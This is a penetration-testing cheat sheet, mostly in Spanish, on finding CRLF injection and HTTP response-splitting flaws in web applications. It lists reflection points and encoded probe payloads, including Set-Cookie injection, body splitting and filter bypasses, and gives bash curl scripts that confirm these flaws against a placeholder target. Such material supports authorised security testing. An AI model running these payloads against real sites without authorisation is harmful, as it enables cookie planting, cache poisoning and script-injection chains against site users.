---
aliases:
  - CRLFi Detection
  - Response Splitting Detection
  - CRLF Recon
tags:
  - type/technique
  - vuln/crlf-injection
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[CRLF Injection]]"
---
# CRLF Injection - Detección y Reconocimiento

***

## Identificar Puntos de Header Reflexion

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Redirect endpoints | `/redirect?url=...` con Location header | Most common vector. |
| URL shorteners | `/r?to=...` | Same. |
| Login redirects | `?next=...` reflejado en Location | Auth flow. |
| OAuth callbacks | `redirect_uri` en Location | Federation. |
| Custom 30x responses | App-defined redirects | Per-app. |
| Set-Cookie reflection | App reflects user input en Set-Cookie | Less common. |
| User-Agent reflejado en headers | Some apps echo UA en custom header | Edge. |
| Custom headers reflected | `X-Custom-{INPUT}` | App-specific. |
| Path reflected en header | URI reflected in Content-Disposition | Filename context. |
| Filename reflected | Download endpoint con custom filename | `Content-Disposition: filename=USER` |
| Mailer endpoints | Contact form / email | SMTP injection. |
| Logging endpoints | App logs user input | Log poisoning. |
| Reverse proxy headers | `X-Forwarded-*` reflected | Edge. |
| CORS preflight | `Access-Control-*` reflected | CORS injection. |
| Internationalization | Language code en header | Edge. |
| Webhook callbacks | App generates HTTP request con user-controlled data | Outbound CRLF. |
^crlfi-detect-points

___

## Probes con CR/LF

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Standard CRLF | `%0d%0a` (CR + LF) | Standard. |
| Just LF | `%0a` | Some apps. |
| Just CR | `%0d` | Some apps. |
| Doble URL encoded | `%250d%250a` | If app decodes 2x. |
| Unicode line separator | ` `, ` ` | Edge JS context. |
| HTML entity | `&#13;&#10;` | If reflected en HTML. |
| Mixed CRLF | `%0d%0d%0a%0a` | Multi-line. |
| Probe inject header | `?url=test%0d%0aSet-Cookie:atacante=1` | Cookie inject. |
| Probe inject body | `?url=test%0d%0a%0d%0a<html>...` | Body split. |
| Marker pattern | `%0d%0aX-Probe:%20MARKER123` | Easy grep en response. |
| Differential length | Long input → response length differs | Indirect detection. |
| HTTP response status differential | Multiple Location headers → 500 vs 302 | Validation indicator. |
| Multi-line via newline | `\nX-Inject:%201` | Backend may strip. |
| Force multiple Set-Cookie | `%0d%0aSet-Cookie:%20a=1%0d%0aSet-Cookie:%20b=2` | Multi-cookie inject. |
^crlfi-detect-probes

### Probe rápido bash

```bash
# Test reflection en Location header
PAYLOAD='%0d%0aX-CRLF-PROBE:%20FOUND'
URL="https://target/redirect?url=test${PAYLOAD}"

R=$(curl -sI "$URL")
echo "$R"

# Look for X-CRLF-PROBE header en response → CRLF injection confirmed
echo "$R" | grep -i 'X-CRLF-PROBE' && echo "[+] CRLF injection confirmed"

# Test in different fields
for field in url next return goto continue redirect path; do
  R=$(curl -sI "https://target/login?$field=test${PAYLOAD}")
  if echo "$R" | grep -q 'X-CRLF-PROBE'; then
    echo "[+] CRLF en field: $field"
  fi
done
```

___

## Detectar Response Splitting Potencial

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Multi-line value en Location header | `Location: /path%0d%0aFoo:bar` | If preserved → splitting potencial. |
| Inject empty line `%0d%0a%0d%0a` | Two CRLFs end headers, start body | Standard splitting. |
| HTTP version reflection | `?http=1.1` reflected en status line | Edge case. |
| Status code reflection | App reflects status | Edge. |
| Smuggle entire response | `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a...` | Split + inject second response. |
| Cookie injection confirms | If `Set-Cookie:` injected appears | Confirmed. |
| Browser-side split rendering | Browser interprets second response | XSS chain. |
| Cache poisoning indicator | Same URL different responses cached | Combine. |
| WAF blocks Inject patterns | If `\r\n` filtered → bypass needed | Filter detect. |
| Server framework | Per-server behavior (Apache, nginx, IIS) | Per-stack. |
| HTTP/2 :path injection | H2 pseudo-header CRLF | H2-specific. |
| Header smuggling | Inject inter-server (proxy → backend) | Combine HRS. |
^crlfi-detect-splitting

### Workflow detection completo

```bash
TARGET="https://target/redirect"
PARAM="url"

# Stage 1: Confirm reflection en header
PROBE_VAL='test'
RESP=$(curl -sI "$TARGET?$PARAM=$PROBE_VAL")
echo "$RESP" | grep -i 'location:.*test' && echo "[*] Reflected en Location"

# Stage 2: CRLF injection probe
PAYLOAD='test%0d%0aX-CRLFi:%20DETECTED'
RESP=$(curl -sI "$TARGET?$PARAM=$PAYLOAD")
echo "$RESP" | grep -i 'X-CRLFi' && echo "[+] CRLF injection vulnerable"

# Stage 3: Confirm header injection control
PAYLOAD='test%0d%0aSet-Cookie:%20pwned=1'
RESP=$(curl -sI "$TARGET?$PARAM=$PAYLOAD")
echo "$RESP" | grep -i 'set-cookie:.*pwned' && echo "[!] Set-Cookie injection works"

# Stage 4: Response splitting probe (full body inject)
PAYLOAD='test%0d%0a%0d%0a<html><body>SPLIT-MARKER</body></html>'
RESP=$(curl -s "$TARGET?$PARAM=$PAYLOAD")
echo "$RESP" | grep -q 'SPLIT-MARKER' && echo "[!!] Full response splitting + body injection"

# Stage 5: Various encoding bypasses
for enc in '%0d%0a' '%0a' '%0d' '%252e%252e' '%E5%98%8A%E5%98%8D'; do
  echo "Testing encoding: $enc"
  curl -sI "$TARGET?$PARAM=test${enc}X-Test:%201" | grep -i 'X-Test'
done
```

***
